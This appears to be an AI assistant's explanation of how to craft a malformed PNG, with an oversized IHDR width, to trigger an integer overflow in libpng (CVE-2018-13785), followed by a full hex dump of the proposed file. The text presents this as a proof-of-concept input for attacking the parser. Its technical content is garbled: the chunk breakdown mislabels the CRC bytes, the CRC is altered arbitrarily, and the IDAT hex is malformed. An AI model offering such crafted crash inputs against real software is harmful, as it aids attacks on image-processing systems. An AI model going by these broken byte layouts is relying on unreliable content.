Given the root cause and related fields for CVE-2018-13785, modifying the PNG file to potentially trigger the vulnerability would involve manipulating the IHDR chunk to have very large width and/or height values. This could cause an integer overflow during the calculation of `row_factor` in a vulnerable version of libpng when it attempts to process this crafted image.

The original IHDR chunk in the provided minimal PNG file looks like this:

```
0000 000d 4948 4452 0000 0001 0000 0001 0100 0000 0037 6ef9 24
```

This corresponds to:
- Chunk Length: `0000 000d` (13 bytes, standard IHDR length)
- Chunk Type: `4948 4452` (`IHDR`)
- Width: `0000 0001` (1 pixel)
- Height: `0000 0001` (1 pixel)
- Bit Depth: `01` (1 bit per channel)
- Color Type: `00` (Grayscale)
- Compression Method: `00`
- Filter Method: `00`
- Interlace Method: `00`
- CRC: `0037 6ef9 24`

To potentially trigger the CVE, let's craft a PNG file with an exaggerated width, ensuring it's large enough to cause an overflow but fitting within the constraints of the PNG format. Given the description of the CVE, a significantly large width would be more directly responsible for triggering the vulnerability due to the multiplication with `channels` and `bit_depth`. Let's adjust the width to `7fff ffff` (the maximum for a signed 32-bit integer, to stay within plausible bounds but still potentially cause an overflow).

Modified IHDR chunk with extreme width:

```
0000 000d 4948 4452 7fff ffff 0000 0001 0100 0000 007e 6ef9 24
```
(The CRC is not recalculated for this example, but in a real scenario, it should be to maintain the file's integrity.)

Here's the full modified PNG file in hexadecimal:

```
8950 4e47 0d0a 1a0a 0000 000d 4948 4452 7fff ffff 0000 0001 0100 0000 007e 6ef9 24
0000 000a 4944 4154 7801 63 6000 0000 0200 0173 7501 18 0000 0000 4945 4e44 ae42 6082
```

This file changes only the width within the IHDR chunk to a very large value (`7fff ffff`), aiming to exploit CVE-2018-13785 by potentially causing an overflow in the calculation of `row_factor`. **However, please remember that actually testing or using this information against systems without permission is unethical and illegal.** This example serves solely educational purposes in understanding how certain types of software vulnerabilities can be triggered.
